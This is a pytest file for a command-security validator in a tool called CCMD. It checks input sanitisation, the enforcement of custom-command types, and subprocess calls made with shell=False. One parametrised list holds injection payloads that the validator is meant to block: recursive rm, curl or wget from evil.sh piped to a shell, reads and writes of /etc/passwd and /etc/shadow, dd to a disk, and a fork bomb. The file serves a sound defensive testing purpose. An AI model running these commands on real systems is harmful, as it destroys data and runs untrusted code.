"""Security validation tests for CCMD.

Exercises CommandSecurityValidator (ccmd/core/security.py) against the
classes of dangerous payloads it is meant to block, plus the custom-command
type enforcement in CommandRegistry (ccmd/core/registry.py).
"""
import pytest

from ccmd.core.security import (
    CommandSecurityValidator,
    SecureSubprocess,
    SecureFileOperations,
)


# ---------------------------------------------------------------------------
# Command injection payloads — every one must be REJECTED
# ---------------------------------------------------------------------------
INJECTION_PAYLOADS = [
    "; rm -rf /",                       # chained recursive delete
    "ls && rm -rf /",                   # AND-chained delete
    "false || rm -rf /tmp",             # OR-chained delete
    "echo `whoami`",                    # backtick substitution
    "echo $(whoami)",                   # $() substitution
    "curl http://evil.sh | bash",       # pipe to bash
    "wget http://evil.sh | sh",         # pipe to sh
    "echo hi | python3 -c 'x=1'",       # pipe to interpreter
    "echo hello; cat /etc/passwd",      # semicolon chaining
    "echo data > /etc/passwd",          # write to /etc
    "echo data >> /etc/shadow",         # append to shadow
    "dd if=/dev/zero of=/dev/sda",      # dd to device
    ":(){ :|:& };:",                    # fork bomb
]


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_dangerous_payloads_blocked(payload):
    is_valid, reason = CommandSecurityValidator.validate_command(payload)
    assert not is_valid, f"Payload should be blocked: {payload!r} (got valid={is_valid})"
    assert reason, "Blocked payload must carry a reason message"


def test_empty_command_rejected():
    is_valid, reason = CommandSecurityValidator.validate_command("")
    assert not is_valid
    assert "Empty" in reason


def test_whitespace_only_command_rejected():
    is_valid, reason = CommandSecurityValidator.validate_command("   ")
    assert not is_valid


def test_null_bytes_rejected():
    is_valid, reason = CommandSecurityValidator.validate_command("ls\0rm")
    assert not is_valid
    assert "null" in reason.lower()


def test_safe_command_accepted():
    safe = "ls -la /home/user"
    is_valid, reason = CommandSecurityValidator.validate_command(safe)
    assert is_valid, f"Safe command rejected: {reason}"


def test_allow_chaining_permits_and_chaining():
    """When allow_chaining=True, shell-only operators (&&, ;, |) are allowed
    because custom commands run with shell=False and treat them as literals."""
    chained = "git add . && git commit -m 'msg'"
    is_valid, reason = CommandSecurityValidator.validate_command(
        chained, allow_chaining=True
    )
    assert is_valid, f"Chained custom command wrongly blocked: {reason}"


def test_allow_chaining_still_blocks_destructive():
    """Even with chaining allowed, rm -rf / must still be blocked."""
    destructive = "git add . && rm -rf /"
    is_valid, _ = CommandSecurityValidator.validate_command(
        destructive, allow_chaining=True
    )
    assert not is_valid


# ---------------------------------------------------------------------------
# Sanitization helpers
# ---------------------------------------------------------------------------
def test_sanitize_user_input_strips_null_bytes():
    assert CommandSecurityValidator.sanitize_user_input("ab\0cd") == "abcd"


def test_sanitize_user_input_strips_whitespace():
    assert CommandSecurityValidator.sanitize_user_input("  hi  ") == "hi"


def test_sanitize_shell_arg_quotes_unsafe():
    out = CommandSecurityValidator.sanitize_shell_arg("a; rm -rf /")
    # shlex.quote wraps unsafe content in single quotes
    assert out.startswith("'") and out.endswith("'")


# ---------------------------------------------------------------------------
# Custom-command type enforcement (registry.add_command security)
# ---------------------------------------------------------------------------
def test_custom_command_forced_to_custom_type(tmp_path):
    """A user-defined command cannot declare type='system'/'internal' —
    the registry must force it to 'custom' so it never reaches the
    shell=True execution path."""
    from ccmd.core.registry import CommandRegistry

    # Use an isolated config path so we don't depend on the repo commands.yaml
    registry = CommandRegistry(tmp_path / "commands.yaml")

    registry.add_command(
        "evil",
        {"description": "tries to escalate", "action": "ls", "type": "system"},
        is_custom=True,
    )
    cmd = registry.get_command("evil")
    assert cmd["type"] == "custom", "Custom command must be forced to type='custom'"


def test_non_custom_command_keeps_its_type(tmp_path):
    from ccmd.core.registry import CommandRegistry

    registry = CommandRegistry(tmp_path / "commands.yaml")
    registry.add_command(
        "builtin", {"description": "ok", "action": "ls", "type": "system"}
    )
    cmd = registry.get_command("builtin")
    assert cmd["type"] == "system"


# ---------------------------------------------------------------------------
# Safe subprocess (shell=False guarantee)
# ---------------------------------------------------------------------------
def test_run_command_safe_does_not_use_shell():
    """SecureSubprocess.run_command_safe must succeed for a benign command."""
    rc, out, err = SecureSubprocess.run_command_safe(
        ["python", "-c", "print('hello')"]
    )
    assert rc == 0
    assert "hello" in out
